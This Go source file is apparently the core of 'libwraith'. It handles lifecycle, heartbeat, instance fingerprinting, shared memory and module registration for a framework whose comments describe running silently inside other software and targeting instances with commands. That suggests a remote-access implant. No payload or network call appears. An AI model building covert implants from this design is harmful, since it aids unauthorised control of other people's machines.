package libwraith

import (
	"context"
	"errors"
	"sync"
	"time"
)

type Wraith struct {
	//
	// Lifecycle control
	//

	// A mutex keeping track of whether this instance of Wraith is
	// running. This ensures that only one mainloop is running at
	// a time per instance of Wraith.
	instanceLock sync.Mutex

	// A context which controls Wraith's lifetime. This is derived
	// from a parent context provided to Wraith's Spawn method.
	ctx context.Context

	// A mutex protecting access to Wraith.ctx.
	ctxLock sync.RWMutex

	// A channel used to check whether Wraith's mainloop is running.
	heartbeat chan struct{}

	//
	// Metadata
	//

	// A time.Time instance keeping track of the time Wraith was
	// initialised/started at so it can be retrieved by modules if
	// needed.
	initTime time.Time

	// A fingerprint to uniquely identify this Wraith. It is
	// generated when first requested via proxy method. This
	// helps to target individual Wraiths with commands, for
	// instance.
	fprint string

	// A mutex protecting access to Wraith.fprint.
	fprintLock sync.RWMutex

	//
	// Modules
	//

	// A shared memory instance used to facilitate communication
	// between modules and Wraith.
	shm shm

	// A map keeping track of which modules are registered to
	// prevent modules from being registered multiple times.
	mods map[string]struct{}

	// A mutex protecting access to Wraith.mods.
	modsLock sync.RWMutex

	//
	// Configuration
	//

	// An instance of WraithConf storing all configuration necessary
	// for Wraith to work correctly.
	conf Config
}

// Helper method to be deferred at the start of all Wraith methods
// to ensure none of them panic and cause the entire program to crash.
// Wraith is meant to be silent when embedded in other software, and
// reliable.
func (w *Wraith) catch() {
	recover()
}

// Spawn an instance of Wraith running synchronously. If you would
// like Wraith to run asynchronously, start this function in a
// goroutine. It can then be stopped by cancelling its context.
//
// The first argument is a context instance used to control Wraith's
// lifetime. The second is an instance of WraithConf containing the
// configuration for this instance of Wraith. It should be fully
// initialised and filled out. An uninitialised config can lead to
// undefined behaviour. The following arguments are modules which
// should be available to Wraith. In case of a name conflict, the
// first module in the list with the name will be used, the others
// will be discarded.
//
// Modules are initialised and started in the order they are given.
// It is highly recommended to pass the comms manager module first
// (possibly preceded by modules it depends on) to make sure module
// communications are not lost.
func (w *Wraith) Spawn(pctx context.Context, conf Config, mods ...mod) {
	defer w.catch()

	// Make sure only one mainloop instance runs. If another mainloop
	// is running, exit immediately.
	single := w.instanceLock.TryLock()
	if !single {
		return
	}
	defer w.instanceLock.Unlock()

	// Take note of start time.
	w.initTime = time.Now()

	// Save a copy of the config.
	w.conf = conf

	// Init heartbeat channel.
	//
	// It is important that this channel is unbuffered, else it will
	// return false positives.
	w.heartbeat = make(chan struct{})

	// Save a copy of the provided context to control Wraith's lifetime.
	w.ctxLock.Lock()
	w.ctx = pctx
	w.ctxLock.Unlock()

	// Init map of modules to keep track of which modules are already
	// active.
	w.mods = make(map[string]struct{})

	// Activate any modules passed directly to this method. This is done
	// asynchronously so the mainloop is able to start. Otherwise this
	// method will not detect a mainloop and hence, fail.
	go w.ModsReg(mods...)

	// Run mainloop.
	//
	// This is the place where any functions which need to be
	// carried out by Wraith itself are handled, based on an event
	// loop. Most functions are carried out by modules, so there
	// shouldn't be too much here.
	for {
		select {
		// If the context was closed...
		case <-w.ctx.Done():
			// ...exit.
			return
		// Write to heartbeat channel whenever an update is requested.
		case w.heartbeat <- struct{}{}:
		}
	}
}

// Check whether Wraith's mainloop is running by issuing a heartbeat
// request and awaiting a response with a configured timeout.
func (w *Wraith) IsAlive() bool {
	if w.heartbeat != nil {
		select {
		case <-w.heartbeat:
			// We have received a heartbeat; definitely running.
			return true
		case <-time.After(w.conf.HeartbeatTimeout):
			// We have reached a timeout without receiving a hearbeat;
			// almost certainly not running.
			return false
		}
	}

	// The heartbeat channel has not been initialised; definitely
	// not running.
	return false
}

//
//
// Proxy Methods
//
//

// These are methods which allow access to Wraith's internal
// properties in a limited manner, to make sure all access
// is safe and will not cause unexpected behaviour.

//
// Init Time
//

// Return the time at which Wraith started initialisation (recorded
// as soon as Wraith confirms that it is the only running instance).
// This will be the time.Time zero value if Wraith has not yet
// started initialisation.
func (w *Wraith) GetInitTime() time.Time {
	defer w.catch()

	return w.initTime
}

//
// Fingerprint
//

// Return Wraith's fingerprint as generated by the configured
// generator. This method checks if the fingerprint has been
// cached and returns the cached value if so. Otherwise, it
// will run the generator function.
func (w *Wraith) GetFingerprint() string {
	defer w.catch()

	w.fprintLock.Lock()
	defer w.fprintLock.Unlock()

	if w.fprint == "" {
		w.fprint = w.conf.FingerprintGenerator()
	}
	return w.fprint
}

//
// Shared Memory
//

// Proxy to shm.Get().
//
// Disallows reading from protected cells.
func (w *Wraith) SHMGet(cellname string) any {
	defer w.catch()

	return w.shm.Get(cellname)
}

// Proxy to shm.Set().
//
// Disallows writing to protected cells.
func (w *Wraith) SHMSet(cellname string, value any) {
	defer w.catch()

	w.shm.Set(cellname, value)
}

// Proxy to shm.Watch().
//
// Disallows watching protected cells.
func (w *Wraith) SHMWatch(cellname string) (chan any, int) {
	defer w.catch()

	return w.shm.Watch(cellname)
}

// Proxy to shm.Unwatch()
//
// Disallows unwatching protected cells.
func (w *Wraith) SHMUnwatch(cellname string, watchId int) {
	defer w.catch()

	w.shm.Unwatch(cellname, watchId)
}

//
// Modules
//

// Add a module to Wraith. These are started straight away automatically.
//
// Panics if Wraith is not running by the time this method is called.
func (w *Wraith) ModsReg(mods ...mod) {
	w.ctxLock.RLock()
	defer w.ctxLock.RUnlock()

	if w.ctx == nil || w.ctx.Err() != nil || !w.IsAlive() {
		panic("wraith not running")
	}

	defer w.catch()

	w.modsLock.Lock()
	defer w.modsLock.Unlock()

	for _, module := range mods {
		modname := module.WraithModuleName()

		// Ignore module if already exists.
		if _, exists := w.mods[modname]; !exists {
			w.mods[modname] = struct{}{}

			// Run the module in a goroutine.
			go func(name string, module mod) {
				// Keep track of when and how many times the module has crashed
				// as not to re-start crashlooped modules.
				var moduleCrashCount int
				var lastModuleCrashTime time.Time

				for {
					// Create a context derived from Wraith's context to control the
					// module's lifetime.
					w.ctxLock.RLock()
					moduleCtx, moduleCtxCancel := context.WithCancel(w.ctx)
					w.ctxLock.RUnlock()
					defer moduleCtxCancel()

					// Run the module and catch any panics or errors.
					err := func() (err error) {
						defer func() {
							if r := recover(); r != nil {
								rstr, ok := r.(string)
								if ok {
									err = errors.New(rstr)
								} else {
									err = errors.New("panic")
								}
							}
						}()
						return module.Mainloop(moduleCtx, w)
					}()

					// If there were any errors, report them.
					if err != nil {
						w.SHMSet(SHM_ERRS, err)
					}

					// If Wraith has exited, do not restart the module.
					w.ctxLock.RLock()
					if w.ctx == nil || w.ctx.Err() != nil || !w.IsAlive() {
						return
					}
					w.ctxLock.RUnlock()

					// Clear crash count if the last crash was a long time ago.
					if time.Since(lastModuleCrashTime) > w.conf.ModuleCrashloopDetectTime {
						moduleCrashCount = 0
					}

					// We have gotten here so the module has crashed and it wasn't
					// supposed to. Note that down.
					moduleCrashCount += 1
					lastModuleCrashTime = time.Now()

					// If the crash count has exceeded the max, do not restart, and
					// remove the module from the list of available modules.
					if moduleCrashCount > w.conf.ModuleCrashloopDetectCount {
						w.modsLock.Lock()
						delete(w.mods, name)
						w.modsLock.Unlock()

						return
					}
				}
			}(modname, module)
		}
	}
}

// Get a list of modules available to Wraith.
func (w *Wraith) ModsGet() []string {
	defer w.catch()

	w.modsLock.RLock()
	defer w.modsLock.RUnlock()

	mods := make([]string, len(w.mods))
	index := 0
	for modname := range w.mods {
		mods[index] = modname
		index++
	}
	return mods
}
